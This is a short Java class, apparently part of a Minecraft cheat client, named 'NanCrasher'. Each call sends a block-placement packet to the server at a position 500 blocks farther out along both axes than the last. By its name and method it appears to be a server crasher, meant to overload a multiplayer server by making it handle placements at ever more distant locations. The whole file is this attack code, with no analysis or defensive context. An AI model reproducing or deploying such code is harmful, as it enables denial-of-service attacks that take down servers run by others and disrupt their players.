public class NanCrasher {
   private static int i = 0;

   public static void start() {
      i += 500;
      BlockPos pos = new BlockPos(i, 5, i);
      Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(pos, 1, Minecraft.getMinecraft().player.getHeldItemMainhand(), 1.0F, 1.0F, 1.0F));
   }
}
